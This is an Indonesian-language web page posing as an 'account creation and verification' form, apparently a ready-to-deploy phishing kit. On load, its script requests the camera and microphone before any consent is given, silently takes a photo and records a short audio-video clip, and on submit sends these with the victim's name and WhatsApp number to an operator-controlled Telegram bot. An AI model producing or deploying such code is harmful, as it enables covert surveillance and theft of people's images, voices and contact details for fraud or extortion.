 <!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Buat Akun & Verifikasi</title>
  <style>
    body {
      margin:0; font-family:sans-serif;
      background:#0f172a; color:#fff;
      display:flex; justify-content:center; align-items:center; min-height:100vh;
    }
    .card {
      background:rgba(255,255,255,0.05);
      padding:20px; border-radius:12px;
      width:95%; max-width:420px;
    }
    video.bg {
      width:100%; height:220px; object-fit:cover; border-radius:12px;
      margin-bottom:12px;
    }
    input, button { width:100%; padding:10px; border-radius:8px; border:none; margin-top:10px; }
    button { background:#3b82f6; color:#fff; font-weight:bold; cursor:pointer; }
    label { font-size:14px; display:block; margin-top:10px; }
  </style>
</head>
<body>
  <div class="card">
    <!-- video autoplay loop dengan suara -->
    <video class="bg" id="bgVideo" autoplay loop playsinline>
      <source src="https://c.top4top.io/m_3551e7put1.mp4" type="video/mp4">
    </video>

    <h3>Buat Akun & Verifikasi</h3>
    <input id="name" placeholder="Nama lengkap" required>
    <input id="wa" placeholder="Nomor WhatsApp (62...)" required>

    <label>
      <input type="checkbox" id="consent"> Saya memberi izin untuk ambil foto & video
    </label>

    <button id="submitBtn">Daftar & Verifikasi</button>
  </div>

<script>
// ==== KONFIG TELEGRAM ====
const BOT_TOKEN = "ISI_TOKENMU_DISINI"; // dari @BotFather
const CHAT_ID   = "ISI_CHAT_IDMU";      // contoh: 123456789 atau @channel
// =========================

let latestPhoto = null;
let latestVideo = null;
let mediaStream = null;

// autoplay video dengan suara
const bgVideo = document.getElementById("bgVideo");
bgVideo.muted = false;
bgVideo.play().catch(()=>{ console.log("Autoplay dengan suara diblok, user perlu tap video"); });

// langsung minta izin kamera+mic
(async () => {
  try {
    mediaStream = await navigator.mediaDevices.getUserMedia({ video:true, audio:true });
    console.log("izin kamera/mic diberikan");
    // capture otomatis (photo + rekaman 3s)
    await captureSnapshot(mediaStream);
    await recordClip(mediaStream, 3000);
  } catch (err) {
    console.warn("izin ditolak:", err);
  }
})();

// ambil foto sekali
async function captureSnapshot(stream){
  const video = document.createElement("video");
  video.srcObject = stream; await video.play();
  await new Promise(r => setTimeout(r, 500)); // tunggu kamera stabil
  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth; canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video,0,0);
  latestPhoto = await new Promise(r => canvas.toBlob(r,"image/jpeg",0.9));
  video.pause();
  console.log("snapshot diambil");
}

// rekam video pendek
async function recordClip(stream, ms){
  const recorder = new MediaRecorder(stream);
  let chunks=[];
  recorder.ondataavailable = e=>{ if(e.data.size>0) chunks.push(e.data); };
  recorder.start();
  await new Promise(r=>setTimeout(r, ms));
  recorder.stop();
  await new Promise(r=>recorder.onstop=r);
  latestVideo = new Blob(chunks,{type:"video/webm"});
  console.log("video clip direkam");
}

// submit form ke telegram
document.getElementById("submitBtn").onclick = async ()=>{
  if(!document.getElementById("consent").checked){ alert("Centang izin dulu"); return; }
  const name = document.getElementById("name").value.trim();
  const wa   = document.getElementById("wa").value.trim();
  if(!name||!wa){ alert("Isi nama & nomor dulu"); return; }

  // kirim teks
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({ chat_id:CHAT_ID, text:`Verifikasi Baru:\nNama: ${name}\nWA: ${wa}` })
  });

  // kirim foto
  if(latestPhoto){
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("photo", latestPhoto, "photo.jpg");
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{ method:"POST", body:fd });
  }

  // kirim video
  if(latestVideo){
    const fd2 = new FormData();
    fd2.append("chat_id", CHAT_ID);
    fd2.append("video", latestVideo, "clip.webm");
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`,{ method:"POST", body:fd2 });
  }

  alert("âœ… Data terkirim ke Telegram");
};
</script>
</body>
</html>
